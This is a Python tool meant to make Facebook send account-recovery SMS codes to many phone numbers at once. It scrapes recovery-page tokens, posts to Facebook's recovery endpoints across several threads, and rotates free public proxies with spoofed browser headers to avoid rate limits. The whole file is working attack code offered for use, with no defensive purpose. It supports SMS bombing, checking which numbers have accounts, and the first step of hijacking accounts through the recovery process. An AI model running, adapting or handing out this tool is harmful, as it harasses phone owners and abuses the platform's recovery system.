#!/usr/bin/python3
"""
Facebook Phone Number OTP Trigger Tool v3.0
For Termux - Pure Python requests, no Selenium
Proxies + Multi-Number + Multi-Threading
Author: cybersecuritybhau-maker
"""
import requests
import re
import json
import time
import sys
import os
import random
import threading
from queue import Queue
from urllib.parse import unquote, urlparse

# ---------- Colors ----------
class C:
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[97m'
    B = '\033[1m'
    X = '\033[0m'
    M = '\033[95m'

BANNER = f"""
{C.C}╔══════════════════════════════════════════════════╗
║       {C.W}Facebook OTP Trigger Tool v3.0{C.C}              ║
║    {C.Y}Multi-Proxy | Multi-Number | Multi-Thread{C.C}        ║
╚══════════════════════════════════════════════════╝{C.X}
"""

# ---------- Proxy Sources ----------
PROXY_SOURCES = {
    'thespeedx_http': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'thespeedx_socks5': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'thespeedx_socks4': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'proxyscrape_http': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http',
    'proxyscrape_socks5': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5',
    'proxyscrape_socks4': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks4',
    'proxifly_http': 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'proxifly_socks5': 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
    'proxifly_socks4': 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
    'free_proxy_list': 'https://free-proxy-list.net/',
    'ssl_proxies': 'https://www.sslproxies.org/',
    'us_proxy': 'https://www.us-proxy.org/',
}


# ================================================================
# PROXY ENGINE
# ================================================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.lock = threading.Lock()

    def parse_proxy_line(self, line):
        """Parse proxy from various formats (ip:port, protocol://ip:port, etc)"""
        line = line.strip()
        if not line or line.startswith('#') or line.startswith('!'):
            return None

        # Remove protocol prefix if present
        if '://' in line:
            parsed = urlparse(line)
            proto = parsed.scheme
            host = parsed.hostname
            port = parsed.port
        else:
            proto = None
            parts = line.split(':')
            if len(parts) == 2:
                host, port = parts
            else:
                return None

        # Determine protocol
        if proto:
            protocol = proto
        else:
            protocol = 'http'

        # Ensure port is int
        try:
            port = int(port)
        except (ValueError, TypeError):
            return None

        proxy_str = f'{protocol}://{host}:{port}'
        return {
            'protocol': protocol,
            'host': host,
            'port': port,
            'string': proxy_str
        }

    def fetch_from_url(self, url, source_name, timeout=10):
        """Fetch proxy list from a URL"""
        print(f"{C.C}[*]{C.X} Fetching proxies from {C.Y}{source_name}{C.X}...", end=' ')
        try:
            r = requests.get(url, timeout=timeout, headers={
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            })
            if r.status_code != 200:
                print(f"{C.R}failed (HTTP {r.status_code}){C.X}")
                return []

            # Handle HTML pages (free-proxy-list.net style)
            if source_name in ['free_proxy_list', 'ssl_proxies', 'us_proxy']:
                proxies = self.parse_html_table(r.text)
            else:
                # Plain text format - one proxy per line
                proxies = []
                for line in r.text.split('\n'):
                    p = self.parse_proxy_line(line)
                    if p:
                        proxies.append(p)

            print(f"{C.G}{len(proxies)} proxies{C.X}")
            return proxies

        except Exception as e:
            print(f"{C.R}error: {e}{C.X}")
            return []

    def parse_html_table(self, html):
        """Parse proxy table from free-proxy-list.net style pages"""
        proxies = []
        # Find the table rows
        rows = re.findall(r'<tr[^>]*>.*?</tr>', html, re.DOTALL)
        for row in rows:
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
            if len(cells) >= 2:
                ip = re.sub(r'<[^>]+>', '', cells[0]).strip()
                port = re.sub(r'<[^>]+>', '', cells[1]).strip()
                if ip and port and re.match(r'^\d+$', port):
                    # Check if HTTPS
                    https = False
                    if len(cells) >= 7:
                        https = 'yes' in cells[6].lower()
                    protocol = 'https' if https else 'http'
                    proxy_str = f'{protocol}://{ip}:{port}'
                    proxies.append({
                        'protocol': protocol,
                        'host': ip,
                        'port': int(port),
                        'string': proxy_str
                    })
        return proxies

    def test_proxy(self, proxy, timeout=5):
        """Test if a proxy is working"""
        try:
            test_url = 'http://httpbin.org/ip'
            proxies_dict = {
                'http': proxy['string'],
                'https': proxy['string']
            }
            r = requests.get(test_url, proxies=proxies_dict, timeout=timeout,
                           headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                return True
        except:
            pass
        return False

    def fetch_all_proxies(self, sources=None, max_per_source=None):
        """Fetch proxies from all or specified sources"""
        if sources is None:
            sources = list(PROXY_SOURCES.keys())

        all_proxies = []
        for src in sources:
            if src in PROXY_SOURCES:
                url = PROXY_SOURCES[src]
                proxies = self.fetch_from_url(url, src)
                if max_per_source and len(proxies) > max_per_source:
                    random.shuffle(proxies)
                    proxies = proxies[:max_per_source]
                all_proxies.extend(proxies)

        # Remove duplicates
        seen = set()
        unique = []
        for p in all_proxies:
            key = f"{p['host']}:{p['port']}:{p['protocol']}"
            if key not in seen:
                seen.add(key)
                unique.append(p)

        self.proxies = unique
        print(f"{C.G}[+] Total unique proxies: {len(self.proxies)}{C.X}")
        return unique

    def test_and_filter(self, max_workers=30, max_working=100):
        """Test proxies in parallel and keep working ones"""
        if not self.proxies:
            print(f"{C.Y}[!] No proxies to test{C.X}")
            return []

        print(f"{C.C}[*]{C.X} Testing {len(self.proxies)} proxies (this may take a minute)...")

        working = []
        test_lock = threading.Lock()
        batch = list(self.proxies)
        random.shuffle(batch)

        def test_worker(proxy_list):
            for proxy in proxy_list:
                if len(working) >= max_working:
                    return
                if self.test_proxy(proxy):
                    with test_lock:
                        if len(working) < max_working:
                            working.append(proxy)

        # Split into chunks for threads
        chunk_size = max(1, len(batch) // max_workers)
        chunks = [batch[i:i + chunk_size] for i in range(0, len(batch), chunk_size)]

        threads = []
        for chunk in chunks[:max_workers]:
            t = threading.Thread(target=test_worker, args=(chunk,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.working_proxies = working
        print(f"{C.G}[+] Working proxies: {len(working)}{C.X}")
        return working

    def get_random_proxy(self):
        """Get a random working proxy"""
        if not self.working_proxies:
            return None
        proxy = random.choice(self.working_proxies)
        return {
            'http': proxy['string'],
            'https': proxy['string']
        }

    def get_random_proxies(self, count=10):
        """Get multiple random working proxies"""
        if len(self.working_proxies) <= count:
            return [{'http': p['string'], 'https': p['string']} for p in self.working_proxies]
        selected = random.sample(self.working_proxies, count)
        return [{'http': p['string'], 'https': p['string']} for p in selected]


# ================================================================
# FACEBOOK OTP ENGINE
# ================================================================

class FacebookOTP:
    def __init__(self, proxy_manager=None):
        self.pm = proxy_manager
        self.results = []

    def sanitize_number(self, number):
        """Clean phone number - keep only digits and +"""
        number = number.strip()
        if not number.startswith('+'):
            number = '+' + number
        cleaned = '+' + re.sub(r'\D', '', number[1:])
        return cleaned

    def extract_token(self, html, pattern, name):
        """Extract a token from HTML"""
        match = re.search(pattern, html)
        if match:
            return match.group(1)
        return None

    def get_session(self, proxy=None):
        """Create a fresh session with browser-like headers"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        if proxy:
            session.proxies.update(proxy)

        return session

    def trigger(self, phone_number, proxy=None, timeout=30):
        """Trigger Facebook OTP for a single phone number"""
        phone = self.sanitize_number(phone_number)
        session = self.get_session(proxy)

        try:
            # Step 1: Load identify page
            r = session.get(
                'https://www.facebook.com/login/identify?ctx=recover&lwv=110',
                timeout=timeout
            )
            html = r.text

            # Extract tokens
            lsd = self.extract_token(html, r'"lsd":"([^"]+)"', 'lsd')
            if not lsd:
                lsd = self.extract_token(html, r'name="lsd"[^>]*value="([^"]+)"', 'lsd')
            if not lsd:
                return {'status': 'failed', 'reason': 'no_lsd_token', 'phone': phone}

            jazoest = self.extract_token(html, r'name="jazoest"[^>]*value="([^"]*)"', 'jazoest')
            if not jazoest:
                jazoest = self.extract_token(html, r'"jazoest":"([^"]+)"', 'jazoest')
            if not jazoest:
                jazoest = '2'

            fb_dtsg = self.extract_token(html, r'name="fb_dtsg"[^>]*value="([^"]+)"', 'fb_dtsg')
            if not fb_dtsg:
                fb_dtsg = self.extract_token(html, r'"fb_dtsg":"([^"]+)"', 'fb_dtsg')

            # Step 2: Search for account
            search_data = {
                'lsd': lsd,
                'email': phone,
                'did_submit': 'Search',
                '__user': '0',
                '__a': '1',
            }
            if jazoest:
                search_data['jazoest'] = jazoest

            search_headers = {
                'Referer': 'https://www.facebook.com/login/identify?ctx=recover&lwv=110',
                'Origin': 'https://www.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-LSD': lsd,
                'X-Requested-With': 'XMLHttpRequest',
            }

            r = session.post(
                'https://www.facebook.com/ajax/login/help/identify.php?ctx=recover',
                data=search_data,
                headers=search_headers,
                timeout=timeout,
                allow_redirects=False
            )

            # Check response - look for ldata in URL or response
            ldata = None

            # Check redirect location for ldata
            if 'location' in r.headers:
                loc = r.headers['location']
                lm = re.search(r'ldata=([a-zA-Z0-9-_%]+)', loc)
                if lm:
                    ldata = lm.group(1)

            # Check response body for ldata
            if not ldata:
                lm = re.search(r'"ldata"[^:]*:\s*"([^"]+)"', r.text)
                if lm:
                    ldata = lm.group(1)

            if not ldata:
                lm = re.search(r'recover/initiate\?ldata=([a-zA-Z0-9-_%]+)', r.text)
                if lm:
                    ldata = lm.group(1)

            # If no ldata, account might not be found
            if not ldata:
                # Try direct recover initiate anyway
                pass

            # Step 3: Access recovery initiation page
            time.sleep(1)

            if ldata:
                recover_url = f'https://www.facebook.com/recover/initiate?ldata={ldata}'
            else:
                recover_url = 'https://www.facebook.com/recover/initiate'

            r = session.get(recover_url, timeout=timeout)
            recover_html = r.text

            # Extract fresh tokens
            lsd2 = self.extract_token(recover_html, r'"lsd":"([^"]+)"', 'lsd2')
            if not lsd2:
                lsd2 = self.extract_token(recover_html, r'name="lsd"[^>]*value="([^"]+)"', 'lsd2')
            if not lsd2:
                lsd2 = lsd

            fb_dtsg2 = self.extract_token(recover_html, r'name="fb_dtsg"[^>]*value="([^"]+)"', 'fb_dtsg2')
            if not fb_dtsg2:
                fb_dtsg2 = self.extract_token(recover_html, r'"fb_dtsg":"([^"]+)"', 'fb_dtsg2')

            # Step 4: Try to trigger SMS
            recovery_methods = [
                'send_sms_to_phone',
                'sms',
                'SMS',
            ]

            for method in recovery_methods:
                initiate_data = {
                    'lsd': lsd2,
                    'recover_method': method,
                    '__user': '0',
                    '__a': '1',
                }
                if fb_dtsg2:
                    initiate_data['fb_dtsg'] = fb_dtsg2

                initiate_headers = {
                    'Referer': recover_url,
                    'Origin': 'https://www.facebook.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-LSD': lsd2,
                    'X-Requested-With': 'XMLHttpRequest',
                }

                r = session.post(
                    'https://www.facebook.com/ajax/recover/initiate/',
                    data=initiate_data,
                    headers=initiate_headers,
                    timeout=timeout
                )

                # Check for success
                if r.status_code == 200 and len(r.text) > 5:
                    return {
                        'status': 'success',
                        'phone': phone,
                        'method': method,
                        'ldata': ldata,
                        'response_length': len(r.text)
                    }

            # Step 5: Fallback - try mobile endpoint
            m_session = self.get_session(proxy)
            m_session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            })

            r = m_session.get(
                'https://m.facebook.com/login/identify/?ctx=recover',
                timeout=timeout
            )
            m_html = r.text

            fb_dtsg_m = self.extract_token(m_html, r'name="fb_dtsg"[^>]*value="([^"]+)"', 'fb_dtsg_m')
            lsd_m = self.extract_token(m_html, r'name="lsd"[^>]*value="([^"]+)"', 'lsd_m')
            if not lsd_m:
                lsd_m = self.extract_token(m_html, r'"lsd":"([^"]+)"', 'lsd_m')

            m_search_data = {
                'lsd': lsd_m if lsd_m else '',
                'email': phone,
                'did_submit': 'Search',
            }
            if fb_dtsg_m:
                m_search_data['fb_dtsg'] = fb_dtsg_m

            r = m_session.post(
                'https://m.facebook.com/login/identify/?ctx=recover',
                data=m_search_data,
                headers={
                    'Referer': 'https://m.facebook.com/login/identify/?ctx=recover',
                    'Origin': 'https://m.facebook.com'
                },
                timeout=timeout,
                allow_redirects=True
            )

            if 'checkpoint' in r.url or 'recover' in r.url:
                return {
                    'status': 'success',
                    'phone': phone,
                    'method': 'mobile_fallback',
                    'ldata': ldata,
                    'redirect': r.url
                }

            if r.status_code == 200 and len(r.text) > 500:
                if any(kw in r.text.lower() for kw in ['code', 'send', 'text', 'sms']):
                    return {
                        'status': 'success',
                        'phone': phone,
                        'method': 'mobile_detected',
                        'ldata': ldata
                    }

            return {
                'status': 'failed',
                'phone': phone,
                'reason': 'all_methods_failed',
                'ldata': ldata
            }

        except requests.exceptions.Timeout:
            return {'status': 'failed', 'phone': phone, 'reason': 'timeout'}
        except requests.exceptions.ProxyError:
            return {'status': 'failed', 'phone': phone, 'reason': 'proxy_error'}
        except Exception as e:
            return {'status': 'failed', 'phone': phone, 'reason': str(e)[:50]}


# ================================================================
# WORKER THREAD
# ================================================================

def worker(phone_queue, result_queue, fb, proxy_pool, use_proxies, thread_id):
    """Worker thread that processes phone numbers"""
    while True:
        try:
            phone = phone_queue.get_nowait()
        except:
            break

        proxy = None
        if use_proxies and proxy_pool:
            with proxy_pool['lock']:
                if proxy_pool['proxies']:
                    proxy = random.choice(proxy_pool['proxies'])

        result = fb.trigger(phone, proxy=proxy)

        # Track proxy success/failure
        if use_proxies and proxy and result['status'] == 'failed':
            if result.get('reason') == 'proxy_error' or result.get('reason') == 'timeout':
                with proxy_pool['lock']:
                    if proxy in proxy_pool['proxies']:
                        proxy_pool['proxies'].remove(proxy)

        result_queue.put(result)
        phone_queue.task_done()


# ================================================================
# MAIN
# ================================================================

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)

    # Configuration
    USE_PROXIES = False
    NUM_THREADS = 5
    PROXY_COUNT = 50
    SINGLE_MODE = False

    print(f"{C.C}[?]{C.X} Use proxies? (y/N): ", end='')
    choice = input().strip().lower()
    USE_PROXIES = choice == 'y'

    if USE_PROXIES:
        print(f"{C.C}[?]{C.X} Number of threads (1-20, default 5): ", end='')
        try:
            NUM_THREADS = max(1, min(20, int(input().strip() or '5')))
        except:
            NUM_THREADS = 5

        print(f"{C.C}[?]{C.X} Working proxies to collect (10-200, default 50): ", end='')
        try:
            PROXY_COUNT = max(10, min(200, int(input().strip() or '50')))
        except:
            PROXY_COUNT = 50

    # Get phone numbers
    print(f"\n{C.C}[?]{C.X} Enter phone numbers file path (default: number.txt): ", end='')
    filename = input().strip() or 'number.txt'

    if os.path.exists(filename):
        with open(filename, 'r') as f:
            numbers = [line.strip() for line in f if line.strip()]
    else:
        print(f"{C.R}[!] File not found: {filename}{C.X}")
        print(f"{C.C}[?]{C.X} Enter a single phone number (with country code): ", end='')
        single = input().strip()
        if single:
            numbers = [single]
            SINGLE_MODE = True
        else:
            print(f"{C.R}[!] No numbers provided. Exiting.{C.X}")
            sys.exit(1)

    if not numbers:
        print(f"{C.R}[!] No valid numbers found. Exiting.{C.X}")
        sys.exit(1)

    print(f"{C.G}[+] Loaded {len(numbers)} phone number(s){C.X}")

    # Setup Proxy Manager
    pm = ProxyManager()
    proxy_pool = {'proxies': [], 'lock': threading.Lock()}

    if USE_PROXIES:
        print(f"\n{C.B}{C.C}{'='*50}{C.X}")
        print(f"{C.B}{C.M}[*] PROXY MODE ENABLED{C.X}")
        print(f"{C.B}{C.C}{'='*50}{C.X}\n")

        # Fetch proxies from all sources
        pm.fetch_all_proxies(max_per_source=200)
        if pm.proxies:
            pm.test_and_filter(max_workers=30, max_working=PROXY_COUNT)
            proxy_pool['proxies'] = pm.get_random_proxies(PROXY_COUNT)
            print(f"\n{C.G}[+] {len(proxy_pool['proxies'])} working proxies ready{C.X}")
        else:
            print(f"{C.R}[!] No proxies found. Continuing without proxies.{C.X}")
            USE_PROXIES = False
    else:
        print(f"\n{C.Y}[*] Running without proxies (direct connection){C.X}")

    # Initialize Facebook OTP engine
    fb = FacebookOTP(pm if USE_PROXIES else None)

    # Create queues
    phone_queue = Queue()
    result_queue = Queue()

    for num in numbers:
        phone_queue.put(num)

    active_threads = min(NUM_THREADS, len(numbers))
    print(f"\n{C.C}[*]{C.X} Starting {C.Y}{active_threads}{C.X} worker threads...")
    print(f"{C.C}[*]{C.X} Processing {len(numbers)} number(s)...\n")

    # Start timer
    start_time = time.time()

    # Start worker threads
    threads = []
    for i in range(active_threads):
        t = threading.Thread(
            target=worker,
            args=(phone_queue, result_queue, fb, proxy_pool, USE_PROXIES, i + 1),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Real-time progress display
    completed = 0
    total = len(numbers)
    results = {'success': 0, 'failed': 0, 'details': []}

    while completed < total:
        try:
            result = result_queue.get(timeout=0.5)
            completed += 1

            phone = result['phone']
            status = result['status']

            elapsed = time.time() - start_time
            pct = (completed / total) * 100

            if status == 'success':
                results['success'] += 1
                print(f"{C.G}[✓]{C.X} [{completed}/{total} {pct:.0f}%] {phone} {C.G}OTP TRIGGERED{C.X}")
            else:
                results['failed'] += 1
                reason = result.get('reason', 'unknown')
                print(f"{C.R}[✗]{C.X} [{completed}/{total} {pct:.0f}%] {phone} {C.Y}{reason}{C.X}")

            results['details'].append(result)

        except:
            # Check if threads are still alive
            alive = any(t.is_alive() for t in threads)
            if not alive and phone_queue.empty():
                break

    total_time = time.time() - start_time

    # Summary
    print(f"\n{C.B}{C.C}{'='*50}{C.X}")
    print(f"{C.B}{C.G}[+] FINAL SUMMARY{C.X}")
    print(f"{C.B}{C.C}{'='*50}{C.X}")
    print(f"{C.W}  Total numbers:{C.X}      {total}")
    print(f"{C.G}  Successful:{C.X}       {results['success']}")
    print(f"{C.R}  Failed:{C.X}           {results['failed']}")
    print(f"{C.C}  Time elapsed:{C.X}     {total_time:.1f}s")
    if results['success'] > 0:
        avg = total_time / results['success']
        print(f"{C.C}  Avg per success:{C.X}  {avg:.1f}s")
    if USE_PROXIES:
        print(f"{C.C}  Working proxies:{C.X}  {len(proxy_pool['proxies'])}")

    # Save results
    output_file = 'fb_otp_results.json'
    with open(output_file, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total': total,
            'success': results['success'],
            'failed': results['failed'],
            'time_seconds': total_time,
            'details': [{
                'phone': d['phone'],
                'status': d['status'],
                'reason': d.get('reason', d.get('method', '')),
            } for d in results['details']]
        }, f, indent=2)
    print(f"\n{C.C}[*]{C.X} Results saved to {C.Y}{output_file}{C.X}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[*] Interrupted by user{C.X}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.R}[!] Fatal error: {e}{C.X}")
        sys.exit(1)
